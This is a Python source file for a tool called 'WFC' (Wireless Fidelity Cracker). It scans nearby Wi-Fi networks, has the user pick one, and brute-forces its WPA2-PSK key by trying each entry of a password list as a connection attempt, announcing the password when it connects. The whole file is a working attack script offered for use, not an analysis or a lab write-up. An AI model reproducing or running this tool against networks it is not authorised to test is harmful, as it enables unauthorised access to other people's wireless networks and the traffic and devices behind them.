" WFC : https://github.com/MSFPT/WFC "

from os import get_terminal_size , name as osn , system , geteuid as user
from subprocess import check_output
from sys import version_info as pyv
from time import sleep

try:
  from colorama import Fore as color , Back as bg , Style , init
  from pywifi import const , PyWiFi , Profile
except ModuleNotFoundError:quit("python3 -m pip install -r WFC/requirements.txt")

init(autoreset=True, wrap=True)
bold='\033[1m'if(osn=='posix')else''
warn=color.LIGHTRED_EX+'(!)'+color.WHITE

def clear(msg:str=None)->0:
  system(['clear','cls'][osn=='nt'])
  if(msg!=None):print(msg)

def SetTitle(title):print(f'\33]0;{title}\a', end='', flush=True)if(osn=='posix')else system(f'title {title}')

class main():
  status = True
  def __init__(self) -> 0:
    SetTitle("WiFi Cracker")
    try:
      self.wifi = PyWiFi()
      self.interface = self.wifi.interfaces()[0] # Select First Wireless Interface Card
      self.banner()
    except FileNotFoundError:quit("Turn on WiFi!")

    otk= ' '*(self.tw//4-7)
    if len(otk)>=15:otk= otk[0:-11]
    sleep(.2)

    print(f"\r{otk[0:len(otk)//2]}{color.LIGHTGREEN_EX}[{color.LIGHTCYAN_EX}*{color.LIGHTGREEN_EX}]{color.LIGHTMAGENTA_EX} Scanning ... ", end='', flush=True)
    self.APs = self.scan()
    print(f"\r{otk[0:len(otk)//2]}{color.LIGHTGREEN_EX}[{color.LIGHTCYAN_EX}*{color.LIGHTGREEN_EX}]{color.LIGHTMAGENTA_EX} Scanned"+' '*6, end='', flush=True)
    sleep(.4)

    print(f"\r{otk[0:len(otk)//2]}{color.LIGHTGREEN_EX}[{color.LIGHTCYAN_EX}*{color.LIGHTGREEN_EX}]{color.LIGHTMAGENTA_EX} choose of the SSIDs below :", end='\n', flush=True)
    sleep(.4)

    for i in range(len(self.APs)):
      print(f"\n{otk+color.LIGHTGREEN_EX}[{color.LIGHTCYAN_EX}{i+1}{color.LIGHTGREEN_EX}]{color.MAGENTA} {self.APs[i].ssid}")
      sleep(.2)
      
    print(f"\n{otk[0:(len(otk)//2)]}{color.LIGHTGREEN_EX}[{color.LIGHTCYAN_EX}*{color.LIGHTGREEN_EX}]{color.LIGHTMAGENTA_EX} press enter to refresh \n")
    
    while True:
      try:
        inp = self.input('ssid')
        if inp=='':self.__init__()
        else:
          index = int(inp)
          target = self.APs[index-1]

          print(f"\n  {color.BLUE}@SSID : {color.CYAN}{target.ssid}\n")

          passlist , stat = self.Getpwl() # PassWord List

          if stat :
            try:
              for password in passlist.readlines() :
                password = password.strip("\n")
                if len(password)<8 or len(password)>64 :
                  print(f"\n   {warn} password structure is incorrect! : {password}")
                  continue
                print("\n  [*] Testing : {}".format(password))
                if self.TcWifi(target.ssid , password) : # Test for connection using password
                  print(f"\n{self.dwb+Style.RESET_ALL}  [#] PASSWORD found : {password} \n{self.dwb}")
                  self.status = False
                  break
              if (self.status) :print(f"\n   {warn} password was not found in password-list!\n")
            except:pass
          else:print(f"\n   {warn} Could not open file! \n")

      except IndexError:
        print(f"\n   {warn} SSID name is incorrect! or lost ...\n")
        continue
      except ValueError:
        print(f"\n   {warn} input is incorrect!\n")
        continue
      except EOFError:
        print()
        continue
    
  def banner(self):
    self.tw = get_terminal_size()[0]
    self.dwb = color.WHITE+bold+('-'*(self.tw-2)).center(self.tw, ' ')+'\n'
    qwb = (' '*(self.tw-18))+Style.RESET_ALL+Style.DIM+'(Ctrl+C to quit)'
    clear(self.dwb+color.RED+bold+' Wireless Fidelity Cracker '.center(self.tw,' ')+'\n'+self.dwb+qwb)
    sleep(.347)

  def input(self, dir, iw=1):return input(f"{Style.RESET_ALL+bold+color.GREEN+' '*iw+'@WFC'+Style.RESET_ALL+':'+Style.RESET_ALL+bold+color.BLUE+f'~/{dir}'+Style.RESET_ALL}$ {color.WHITE}").strip()

  def Getpwl(self):
    data = self.input(f'pwl {color.CYAN}(_file) ',2)
    try:return(open(data), True)
    except:return(None, False)


  def scan(self): # For Scan the area
    try:
      self.interface.scan()
      sleep(.4)
      return self.interface.scan_results()
    except:pass
  
  def TcWifi(self, ssid , password):
    self.interface.disconnect()
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK) # AM_TYPE_WPA2PSK
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    self.interface.connect(self.interface.add_network_profile(profile))
    sleep(.07)
    if self.interface.status() == const.IFACE_CONNECTED:
        self.interface.remove_network_profile(profile)
        return True
    else:
        self.interface.remove_network_profile(profile)
        return False

def checkroot(fn):
  if((osn=='posix')&(user()!=0)):quit('sudo python3 WFC')
  try:fn()
  except KeyboardInterrupt:clear(f'\n  {color.LIGHTGREEN_EX}[{color.LIGHTCYAN_EX}*{color.LIGHTGREEN_EX}]{color.MAGENTA} good bay\n') & quit()

quit("please update python!"if(pyv[0:2]<=(3,7))else '')if(__name__!='__main__')else checkroot(main)